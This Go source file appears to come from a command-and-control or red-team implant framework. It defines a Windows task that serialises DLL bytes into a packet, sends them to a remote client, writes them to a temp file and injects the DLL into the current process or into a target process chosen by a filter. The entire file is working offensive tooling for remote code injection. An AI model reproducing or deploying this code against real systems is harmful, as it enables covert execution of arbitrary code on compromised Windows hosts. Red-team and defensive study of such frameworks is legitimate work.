package wintask

import (
	"bytes"
	"context"
	"io"
	"io/ioutil"
	"os"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// DLLTask is a Windows specific task that relates to loading a DLL into a process.
const DLLTask = dllTasker(0xC5)

// DLL is a struct that is similar to the 'cmd.DLL' struct. This is used to Task a Client with loading a DLL
// on Windows devices. This struct has many of the functionallies of the standard 'cmd.DLL' function. The
// 'SetParent' function will attempt to set the target that runs the DLL. If none are specified, the DLL
// will be injected into the current process.
//
// The Path parameter is the path (on the client) where the DLL is located. Name may be omitted and Data
// can be filled with the raw binary data to send and load a DLL instead.
type DLL struct {
	Path   string
	Data   []byte
	Filter *cmd.Filter
}
type dllTasker uint8

func (dllTasker) Thread() bool {
	return false
}

// LoadDLL is a function that will generate a Task packet for loading a DLL from the specified Reader.
// This will read the data and pack it into the Packet to be downloaded onto the host.
func LoadDLL(r io.Reader) (*com.Packet, error) {
	var b bytes.Buffer
	if _, err := io.Copy(&b, r); err != nil {
		return nil, err
	}
	var (
		p = &com.Packet{ID: uint8(DLLTask)}
		d = DLL{Data: b.Bytes()}
	)
	d.MarshalStream(p)
	return p, nil
}

// LoadDLLFile is a function that will generate a Task packet for loading a DLL from the specified local
// file path. This will read the file and pack it into the Packet to be downloaded onto the host.
func LoadDLLFile(s string) (*com.Packet, error) {
	f, err := os.OpenFile(device.Expand(s), os.O_RDONLY, 0)
	if err != nil {
		return nil, err
	}
	p, err := LoadDLL(f)
	f.Close()
	return p, err
}

// MarshalStream writes the data for this DLL task to the supplied Writer.
func (d DLL) MarshalStream(w data.Writer) error {
	if err := w.WriteString(d.Path); err != nil {
		return err
	}
	if err := w.WriteBool(d.Filter != nil); err != nil {
		return err
	}
	if d.Filter != nil {
		if err := d.Filter.MarshalStream(w); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(d.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this DLL task from the supplied Reader.
func (d *DLL) UnmarshalStream(r data.Reader) error {
	if err := r.ReadString(&d.Path); err != nil {
		return err
	}
	f, err := r.Bool()
	if err != nil {
		return err
	}
	if f {
		d.Filter = new(cmd.Filter)
		if err := d.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if d.Data, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func (dllTasker) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
	var d DLL
	if err := d.UnmarshalStream(p); err != nil {
		return nil, err
	}
	n := d.Path
	if len(d.Data) > 0 {
		f, err := ioutil.TempFile("", "dll")
		if err != nil {
			return nil, err
		}
		_, err = f.Write(d.Data)
		if f.Close(); err != nil {
			return nil, err
		}
		n = f.Name()
	}
	z := cmd.NewDllContext(x, n)
	z.SetParent(d.Filter)
	if err := z.Start(); err != nil {
		return nil, err
	}
	var (
		w    = new(com.Packet)
		h, _ = z.Handle()
	)
	w.WriteUint64(uint64(h))
	return w, nil
}
